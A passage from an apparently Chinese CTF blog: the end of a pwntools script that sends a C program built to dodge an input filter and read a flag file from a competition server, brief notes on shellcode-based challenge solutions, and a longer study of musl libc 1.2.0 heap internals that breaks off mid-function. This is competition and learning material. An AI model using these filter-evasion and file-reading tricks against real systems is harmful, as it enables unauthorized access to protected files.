arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;183.129.189.60&quot;</span>, <span class="number">10075</span>)</span><br><span class="line"></span><br><span class="line">program = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include&lt;string.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">    char buf[50]; </span></span><br><span class="line"><span class="string">    char path_part_1[5] = &quot;/hom&quot;; </span></span><br><span class="line"><span class="string">    char path_part_2[5] = &quot;e/ct&quot;; </span></span><br><span class="line"><span class="string">    char path_part_3[5] = &quot;f/fl&quot;; </span></span><br><span class="line"><span class="string">    char path_part_4[5] = &quot;agx00&quot;; </span></span><br><span class="line"><span class="string">    char path[20];</span></span><br><span class="line"><span class="string">    sprintf(path, &quot;%s%s%s%s&quot;, path_part_1, path_part_2, path_part_3, path_part_4);</span></span><br><span class="line"><span class="string">    int fd = open(path);</span></span><br><span class="line"><span class="string">    read(fd,buf,50);</span></span><br><span class="line"><span class="string">    write(1,buf,50);</span></span><br><span class="line"><span class="string">&#125;@</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&#x27;@&#x27;)&quot;</span>, program)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>




        <h1 id="四、DEFCON-CTF-Qualifier-2020-introool"   >
          <a href="#四、DEFCON-CTF-Qualifier-2020-introool" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、DEFCON-CTF-Qualifier-2020-introool" class="headerlink" title="四、DEFCON CTF Qualifier 2020 introool"></a>四、DEFCON CTF Qualifier 2020 introool</h1>
      <p>这题不太想调，就是patch，写汇编跳转shellcode等</p>

        <h1 id="五、-Redhat2019-Kaleidoscope"   >
          <a href="#五、-Redhat2019-Kaleidoscope" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、-Redhat2019-Kaleidoscope" class="headerlink" title="五、[Redhat2019] Kaleidoscope"></a>五、[Redhat2019] Kaleidoscope</h1>
      <p>这题找不着附件，简单来说就是两个东西<code>Kaleidoscope</code>即时解释器和<code>honggfuzz</code></p>

        <h1 id="六、2020-DAS-CTF-OJ1"   >
          <a href="#六、2020-DAS-CTF-OJ1" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、2020-DAS-CTF-OJ1" class="headerlink" title="六、2020 DAS-CTF OJ1"></a>六、2020 DAS-CTF OJ1</h1>
      <p>不能输入括号，大中小括号等，例如<code>int main()&#123;&#125;</code>等等都不行，可以用如下的形式来进行</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main=<span class="number">0x55</span>,a1=<span class="number">0x48</span>,a2=<span class="number">0x89</span>,a3=<span class="number">0xe5</span>;</span><br></pre></td></tr></table></div></figure>

<p>编译之后可以看到如下，直接形成汇编代码，那么就可以直接写汇编通i过shellcode或者orw来获取flag了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091335752.png" alt="image-20220209133547687"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091334057.png" alt="image-20220209133415993"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/22/Musl%E4%BB%8E0%E5%BC%80%E5%A7%8B/">Musl从0开始</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-18</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、1-2-0及以前版本"   >
          <a href="#一、1-2-0及以前版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、1-2-0及以前版本" class="headerlink" title="一、1.2.0及以前版本"></a>一、1.2.0及以前版本</h1>
      
        <h2 id="1-数据结构"   >
          <a href="#1-数据结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-数据结构" class="headerlink" title="1.数据结构"></a>1.数据结构</h2>
      
        <h3 id="1-chunk结构"   >
          <a href="#1-chunk结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-chunk结构" class="headerlink" title="(1)chunk结构"></a>(1)chunk结构</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0 定义在src/internal/malloc_impl.h中</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> psize, csize; <span class="comment">// 相当于 glibc 的 prev size 和 size</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>①不重用psize字段</p>
<p>②psize和size都有inuse标志位，分别代表前一个chunk和当前chunk的使用状态。</p>

        <h3 id="2-堆管理结构mal"   >
          <a href="#2-堆管理结构mal" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-堆管理结构mal" class="headerlink" title="(2)堆管理结构mal"></a>(2)堆管理结构mal</h3>
      <p>类似于arena，记录堆中的相关状态，bins结构体等</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  定义在src/malloc/malloc.c中</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap; <span class="comment">//64位无符号整数binmap</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-bitmap"   >
          <a href="#3-bitmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-bitmap" class="headerlink" title="(3)bitmap:"></a>(3)bitmap:</h3>
      <p><code>binmap</code>记录每个 bin 是否为非空，若对应某个比特位为 1，则表示对应的 bin 为非空，存在chunk</p>
<p>在unbin函数操作过程中，如果操作的chunk(C)的prev和next指针相等，就会将对应的bin的bitmap设置为0，使其处于置空的状态。</p>

        <h3 id="4-bins"   >
          <a href="#4-bins" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-bins" class="headerlink" title="(4)bins"></a>(4)bins</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0 定义在src/internal/malloc_impl.h中</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>构成类似unsortedbin的双向循环链表，当链表为空时，<code>head</code>和<code>tail</code>指针等于 0 或者指向链表头部自身。</p>
<p>每个bin存储的chunk范围如下</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">bin 下标 i</th>
<th align="left">chunk 大小个数</th>
<th align="center">chunk 大小范围</th>
<th align="center">下标 i 与 chunk 大小范围的关系</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0-31</td>
<td align="left">1</td>
<td align="center">0x20 – 0x400</td>
<td align="center">(i+1) * 0x20</td>
</tr>
<tr>
<td align="left">32-35</td>
<td align="left">8</td>
<td align="center">0x420 – 0x800</td>
<td align="center">(0x420+(i-32) <em>0x100) ~ (0x500+(i-32)</em> 0x100)</td>
</tr>
<tr>
<td align="left">36-39</td>
<td align="left">16</td>
<td align="center">0x820 – 0x1000</td>
<td align="center">(0x820+(i-36) <em>0x200) ~ (0x1000+(i-36)</em> 0x200)</td>
</tr>
<tr>
<td align="left">40-43</td>
<td align="left">32</td>
<td align="center">0x1020 – 0x2000</td>
<td align="center">(0x1020+(i-40) <em>0x400) ~ (0x1400+(i-40)</em> 0x400)</td>
</tr>
<tr>
<td align="left">44-47</td>
<td align="left">64</td>
<td align="center">0x2020 – 0x4000</td>
<td align="center">(0x2020+(i-44) <em>0x800) ~ (0x2800+(i-44)</em> 0x800)</td>
</tr>
<tr>
<td align="left">48-51</td>
<td align="left">128</td>
<td align="center">0x4020 – 0x8000</td>
<td align="center">(0x4020+(i-48) <em>0x1000) ~ (0x5000+(i-48)</em> 0x1000)</td>
</tr>
<tr>
<td align="left">52-55</td>
<td align="left">256</td>
<td align="center">0x8020 – 0x10000</td>
<td align="center">(0x8020+(i-52) <em>0x2000) ~ (0xa000+(i-52)</em> 0x2000)</td>
</tr>
<tr>
<td align="left">56-59</td>
<td align="left">512</td>
<td align="center">0x10020 – 0x20000</td>
<td align="center">(0x10020+(i-56) <em>0x4000) ~ (0x14000+(i-56)</em> 0x4000)</td>
</tr>
<tr>
<td align="left">60-62</td>
<td align="left">1024</td>
<td align="center">0x20020 – 0x38000</td>
<td align="center">(0x20020+(i-60) <em>0x8000) ~ (0x28000+(i-60)</em> 0x8000)</td>
</tr>
<tr>
<td align="left">63</td>
<td align="left">无限</td>
<td align="center">0x38000 以上</td>
<td align="center">0x38000 ~</td>
</tr>
</tbody></table></div>
<p>前 32 个 bin 类似 fastbin和smallbin，每个 bin 只对应一种大小的 chunk，但是也是双向循环链表，第一个释放到bins中的chunk都会使得next和prev指针带上libc地址。</p>
<p>后面的则类似largebin，对应多种范围大小的chunk。</p>

        <h2 id="2-维护方式"   >
          <a href="#2-维护方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-维护方式" class="headerlink" title="2.维护方式"></a>2.维护方式</h2>
      <p>在 64 位系统下 chunk 大小是以 32 字节对齐的，这与 glibc 16 字节对齐不同，故 chunk 大小最小为 0x20 字节，然后按 0x40、0x60、0x80… 逐渐递增，不共用psize位，所以每次都会将申请的size+0x10。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">malloc(0x10)-&gt;0x20</span><br><span class="line">malloc(0x11)-&gt;0x40</span><br><span class="line">malloc(0x2f)-&gt;0x40</span><br><span class="line">malloc(0x30)-&gt;0x40</span><br><span class="line">malloc(0x31)-&gt;0x60</span><br></pre></td></tr></table></div></figure>

<p>维护链表的方式是 FILO（从链表首部取出 chunk，从尾部插入 chunk），并且都是双向循环链表</p>
<p>没有实现如<code>__malloc_hook</code>、<code>__free_hook</code>之类的 hook 函数</p>

        <h2 id="3-关键函数"   >
          <a href="#3-关键函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-关键函数" class="headerlink" title="3.关键函数"></a>3.关键函数</h2>
      
        <h3 id="1-mallco"   >
          <a href="#1-mallco" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-mallco" class="headerlink" title="(1)mallco"></a>(1)mallco</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调整n大小，对齐0x20</span></span><br><span class="line">	<span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果n大于MMAP_THRESHOLD (0x38000)，使用 mmap</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">		<span class="keyword">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (base == (<span class="keyword">void</span> *)<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		c = (<span class="keyword">void</span> *)(base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line">		<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算对应的binmap下标i</span></span><br><span class="line">	i = bin_index_up(n);</span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//查找binmap</span></span><br><span class="line">		<span class="keyword">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//如果bin均为空，那么调用expand_heap函数延展堆空间，生成新的chunk返回</span></span><br><span class="line">		<span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">			c = expand_heap(n);</span><br><span class="line">			<span class="keyword">if</span> (!c) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (alloc_rev(c)) &#123;</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">x</span> =</span> c;</span><br><span class="line">				c = PREV_CHUNK(c);</span><br><span class="line">				NEXT_CHUNK(x)-&gt;psize = c-&gt;csize =</span><br><span class="line">					x-&gt;csize + CHUNK_SIZE(c);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取大小最接近n(size)的可用bin下标j</span></span><br><span class="line">		j = first_set(mask);</span><br><span class="line">		lock_bin(j);</span><br><span class="line">		c = mal.bins[j].head;</span><br><span class="line">        <span class="comment">//BIN_TO_CHUNK不知道什么函数</span></span><br><span class="line">		<span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;、</span><br><span class="line">            <span class="comment">//使用 pretrim判断c的大小和需求的size(n)，相差太大就切割</span></span><br><span class="line">            <span class="comment">//否则使用 unlock从链表中取出</span></span><br><span class="line">			<span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);</span><br><span class="line">			unlock_bin(j);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		unlock_bin(j);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">    <span class="comment">//切割之后回收 c 中大小超过 n 的部分</span></span><br><span class="line">	trim(c, n);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="详细步骤："   >
          <a href="#详细步骤：" class="heading-link"><i class="fas fa-link"></i></a><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h4>
      <ul>
<li><p>调整 n，对齐0x20</p>
</li>
<li><p> 如果 n &gt; MMAP_THRESHOLD (0x38000)，使用 mmap 创建一块大小为 n 的内存，返回给用户。</p>
</li>
<li><p>如果 n &lt;= MMAP_THRESHOLD (0x38000)，计算 n 对应的 bin 下标 i，查找 binmap</p>
<ul>
<li><p>如果所有的可用 bin 均为空，调用expand_heap函数延展堆空间，生成一个新的 chunk返回</p>
</li>
<li><p>如果存在非空的可用 bin，选择大小最接近 n 的 bins[j]，得到 bin 链表首部的 chunk c<br>如果符合 pretrim 条件，使用 pretrim 分割 c，否则使用 unbin 从链表中取出 c，最后将分割剩下的chunk进入trim函数回收，将c返回给用户。</p>
</li>
</ul>
</li>
</ul>
<p>至于那个unlock_bin好像是同步用的，应该是多线程防止竞争读写吧，不太懂</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="comment">/* Synchronization tools */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">int</span> *lk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (libc.threads_minus_1)</span><br><span class="line">		<span class="keyword">while</span>(a_swap(lk, <span class="number">1</span>)) __wait(lk, lk+<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">unlock</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">int</span> *lk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (lk[<span class="number">0</span>]) &#123;</span><br><span class="line">		a_store(lk, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (lk[<span class="number">1</span>]) __wake(lk, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">lock_bin</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	lock(mal.bins[i].lock);</span><br><span class="line">	<span class="keyword">if</span> (!mal.bins[i].head)</span><br><span class="line">		mal.bins[i].head = mal.bins[i].tail = BIN_TO_CHUNK(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">unlock_bin</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	unlock(mal.bins[i].lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="①unbin"   >
          <a href="#①unbin" class="heading-link"><i class="fas fa-link"></i></a><a href="#①unbin" class="headerlink" title="①unbin"></a>①unbin</h4>
      <p>类似于unlink的解链操作，无任何检测</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unbin</span><span class="params">(struct chunk *c, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">		a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">    <span class="comment">//解链</span></span><br><span class="line">	c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">	c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">//设置 INUSE 标志位，双重标志位都会设置</span></span><br><span class="line">	c-&gt;csize |= C_INUSE;</span><br><span class="line">	NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②pretrim"   >
          <a href="#②pretrim" class="heading-link"><i class="fas fa-link"></i></a><a href="#②pretrim" class="headerlink" title="②pretrim"></a>②pretrim</h4>
      <p>切割chunk，需要满足一定条件才会进行切割操作</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="comment">/* pretrim - trims a chunk _prior_ to removing it from its bin.</span></span><br><span class="line"><span class="comment"> * Must be called with i as the ideal bin for size n, j the bin</span></span><br><span class="line"><span class="comment"> * for the _free_ chunk self, and bin j locked. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pretrim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> n1;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We cannot pretrim if it would require re-binning. */</span></span><br><span class="line">	<span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// 条件 1:j(大小最接近size的可用bin下标)大于 40</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 条件 2: j(大小最接近size的可用bin下标)与i(计算出来的bin下标)相隔 3 个 bin 或以上，</span></span><br><span class="line">    <span class="comment">// 或者j(大小最接近size的可用bin下标)等于63且size相差大于 MMAP_THRESHOLD(0x38000)</span></span><br><span class="line">	<span class="keyword">if</span> (j &lt; i+<span class="number">3</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		n1 = CHUNK_SIZE(self);</span><br><span class="line">		<span class="keyword">if</span> (n1-n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		n1 = CHUNK_SIZE(self);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//条件3: size相差的数值属于bins[j]的范围内，即split与self属于同一个bin</span></span><br><span class="line">	<span class="keyword">if</span> (bin_index(n1-n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//切割出一块大小为n的chunk用来返回</span></span><br><span class="line">	next = NEXT_CHUNK(self);</span><br><span class="line">	split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">	split-&gt;prev = self-&gt;prev;</span><br><span class="line">	split-&gt;next = self-&gt;next;</span><br><span class="line">	split-&gt;prev-&gt;next = split;</span><br><span class="line">	split-&gt;next-&gt;prev = split;</span><br><span class="line">	split-&gt;psize = n | C_INUSE;</span><br><span class="line">	split-&gt;csize = n1-n;</span><br><span class="line">	next-&gt;psize = n1-n;</span><br><span class="line">	self-&gt;csize = n | C_INUSE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>取个名字好听点：</p>
<p><code>J：search_bin_idx</code></p>
<p><code>I：calc_bin_idx</code></p>
<p><code>n：need_size</code></p>
<p>总的条件如下：</p>
<ul>
<li><p><code>search_bin_idx</code>大于 40</p>
</li>
<li><p><code>search_bin_idx</code>与<code>calc_bin_idx</code>相隔 3 个 bin 或以上，或者<code>search_bin_idx</code>等于63且<code>bins[search_bin_idx].head-&gt;size - need_size &gt; MMAP_THRESHOLD(0x38000)</code></p>
</li>
<li><p><code>bins[search_bin_idx].head-&gt;size - need_size</code>的值在<code>bins[search_bin_idx]</code>中</p>
</li>
</ul>
<p>即在将Chunk拿出bin之前，先进行切割赋值，设置对应的指针，然后才解链，chunk还是从bin中找到的chunk，之后在unbin中进行inuse位的修改。</p>

        <h4 id="③trim"   >
          <a href="#③trim" class="heading-link"><i class="fas fa-link"></i></a><a href="#③trim" class="headerlink" title="③trim"></a>③trim</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">trim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//类似于unsortebin中如果多出来的size小于0x10，那就直接返回给用户一样</span></span><br><span class="line">    <span class="comment">//DONTCARE(0x10)，也就是确保回收的chunk的size至少为0x10，chunk至少0x20对齐</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	next = 